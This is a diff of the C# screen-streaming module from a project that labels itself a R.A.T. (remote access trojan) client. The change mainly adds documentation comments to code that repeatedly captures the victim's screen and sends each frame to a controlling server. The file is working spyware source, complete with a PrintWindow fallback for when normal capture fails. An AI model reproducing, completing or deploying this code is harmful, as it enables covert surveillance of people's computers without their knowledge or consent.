@@ -1,97 +1,111 @@
-﻿using System;
-using System.Threading;
-using System.Drawing.Imaging;
-using System.Drawing;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
+﻿using System; //For basic system functions
+using System.Threading; //For threads
+using System.Drawing.Imaging; //For image conversion
+using System.Drawing; //For graphics
+using System.Runtime.InteropServices; //For p/invoke
+using System.Windows.Forms; //For controls
 
+/// <summary>
+/// The R.A.T Namespace
+/// </summary>
 namespace TutClient
 {
+    /// <summary>
+    /// Remote Desktop Module
+    /// </summary>
     class RDesktop
     {
-
+        /// <summary>
+        /// True if we want to shutdown the streaming
+        /// </summary>
         public static bool isShutdown = false;
+        /// <summary>
+        /// <see cref="byte"/> and <see cref="Image"/> Converter
+        /// </summary>
         private static ImageConverter convert = new ImageConverter();
+        /// <summary>
+        /// The byte array representation of the image
+        /// </summary>
         private static byte[] img;
 
-        //this code either sends the primary screen or if there is more than one screen will get the other screens too
+        /// <summary>
+        /// Start sending screen images to the server
+        /// </summary>
         public static void StreamScreen()
         {
-            while (true)
+            while (true) //Infinite loop
             {
-                if (isShutdown)
+                if (isShutdown) //Check if we need to stop
                 {
                     break;
                 }
-                try  // -added the try catch and break ,if the connection got lost the client would still try to send the screen and run on becoming unresponsive
+                try
                 {
 
-                    img = (byte[])convert.ConvertTo(Desktop(), typeof(byte[])); //--this crashes if its not the main window
-                    if (img != null)// added this as sometimes it was null
-                        Program.SendScreen(img);
-                    Array.Clear(img, 0, img.Length);
+                    img = (byte[])convert.ConvertTo(Desktop(), typeof(byte[])); //Convert the desktop image to bytes
+                    if (img != null) //If we have an image
+                        Program.SendScreen(img); //Send the screen data to the server
+                    Array.Clear(img, 0, img.Length); //Clear the bytes array of the image
 
-                    Thread.Sleep(Program.fps);  //this will get the fps from program.cs
-
+                    Thread.Sleep(Program.fps); //Use the specified FPS
                 }
-                catch
+                catch //Something went wrong
                 {
-
-                    isShutdown = true;
+                    isShutdown = true; //Exit the loop
                     break;
                 }
             }
         }
         
+        /// <summary>
+        /// Get the <see cref="Bitmap"/> image of a desktop
+        /// </summary>
+        /// <returns>The <see cref="Bitmap"/> image of the desktop</returns>
         private static Bitmap Desktop()
         {
             try
             {
-                if (Program.ScreenNumber == 0)
+                if (Program.ScreenNumber == 0) //No other screen specified
                 {
-                    Rectangle bounds = Screen.PrimaryScreen.Bounds;
-                    Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
+                    Rectangle bounds = Screen.PrimaryScreen.Bounds; //Get the size of the screen
+                    Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb); //Create a bitmap holder
 
-                    using (Graphics graph = Graphics.FromImage(screenshot)) //added this using to dispose of memory exceptions            
+                    using (Graphics graph = Graphics.FromImage(screenshot)) //Load the holder into graphics
                     {
-                        graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy); //--this crashes when ctrl alt del as its not the primary screen
-
-                    }
-                    GC.Collect(); //---added to cleanup resources
-                    GC.WaitForPendingFinalizers();
-                    Thread.SpinWait(5000);
-
-                    return screenshot;
-
-                }
-                else
-                {
-                    Bitmap bmpScreenshot = new Bitmap(Screen.AllScreens[Program.ScreenNumber].Bounds.Width, Screen.AllScreens[Program.ScreenNumber].Bounds.Height, PixelFormat.Format32bppArgb);
-                    using (Graphics graph = Graphics.FromImage(bmpScreenshot))
-                    {
-
-                        graph.CopyFromScreen(Screen.AllScreens[Program.ScreenNumber].Bounds.X, Screen.AllScreens[1].Bounds.Y, 0, 0, Screen.AllScreens[Program.ScreenNumber].Bounds.Size, CopyPixelOperation.SourceCopy);
-
+                        graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy); //Take the screenshot
                     }
 
+                    //Free resources
                     GC.Collect();
                     GC.WaitForPendingFinalizers();
                     Thread.SpinWait(5000);
 
-                    return bmpScreenshot;
-                    
+                    return screenshot; //Return the image of the desktop
                 }
+                else //A screen is selected
+                {
+                    //Create a bitmap holder for the specified screen
+                    Bitmap bmpScreenshot = new Bitmap(Screen.AllScreens[Program.ScreenNumber].Bounds.Width, Screen.AllScreens[Program.ScreenNumber].Bounds.Height, PixelFormat.Format32bppArgb);
+                    using (Graphics graph = Graphics.FromImage(bmpScreenshot)) //Load the holder into Graphics
+                    {
+                        //Take the screenshot
+                        graph.CopyFromScreen(Screen.AllScreens[Program.ScreenNumber].Bounds.X, Screen.AllScreens[1].Bounds.Y, 0, 0, Screen.AllScreens[Program.ScreenNumber].Bounds.Size, CopyPixelOperation.SourceCopy);
+                    }
 
+                    //Free resources
+                    GC.Collect();
+                    GC.WaitForPendingFinalizers();
+                    Thread.SpinWait(5000);
+
+                    return bmpScreenshot; //Return the image of the specified desktop
+                }
             }
-            catch
+            catch //Something went wrong
             {
-                //this works but only for the main window?? desktop window i need the main window handle in this case windows security dialogue window ,this gets the desktop window handle without task bar
+                //Get the handle of the desktop window
                 IntPtr desktopHwnd = FindWindowEx(GetDesktopWindow(), IntPtr.Zero, "Progman", "Program Manager");
-                //  IntPtr desktopHwnd = FindWindowEx(GetDesktopWindow(), IntPtr.Zero, "Winlogon", "0");
-
 
                 // get the desktop dimensions
-                // if you don't get the correct values then set it manually
                 var rect = new Rectangle();
                 GetWindowRect(desktopHwnd, ref rect);
 
@@ -102,26 +116,48 @@ namespace TutClient
                 PrintWindow(desktopHwnd, dc, 0);
                 memoryGraphics.ReleaseHdc(dc);
 
-
-                GC.Collect(); //----added to cleanup resources
+                //Free resources
+                GC.Collect();
                 GC.WaitForPendingFinalizers();
                 Thread.SpinWait(5000);
                 
-                return bmp;
+                return bmp; //Return the image of the desktop
             }
             
         }
 
+        /// <summary>
+        /// Get the image of a window
+        /// </summary>
+        /// <param name="hwnd">Handle of the window</param>
+        /// <param name="hdc">Pointer to the buffer to save the data to</param>
+        /// <param name="nFlags">The flags of the print</param>
+        /// <returns>The result of the screenshot</returns>
         [DllImport("User32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         static extern bool PrintWindow(IntPtr hwnd, IntPtr hdc, uint nFlags);
-
+        /// <summary>
+        /// Get the rectangle bounds of a window
+        /// </summary>
+        /// <param name="handle">The handle of the window</param>
+        /// <param name="rect">A reference to the Rectangle object to save the data to</param>
+        /// <returns>The result of getting the bounds of the window</returns>
         [DllImport("user32.dll")]
         static extern bool GetWindowRect(IntPtr handle, ref Rectangle rect);
-
+        /// <summary>
+        /// Get the handle of the desktop window
+        /// </summary>
+        /// <returns>The handle of the desktop window</returns>
         [DllImport("user32.dll", EntryPoint = "GetDesktopWindow")]
         static extern IntPtr GetDesktopWindow();
-
+        /// <summary>
+        /// Find a child window
+        /// </summary>
+        /// <param name="parentHandle">The handle of the parent window</param>
+        /// <param name="childAfter">The handle of the child to get the child window after</param>
+        /// <param name="lclassName">Class name of the window</param>
+        /// <param name="windowTitle">Title string of the window</param>
+        /// <returns>The handle to the child window</returns>
         [DllImport("user32.dll", CharSet = CharSet.Unicode)]
         static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);
 
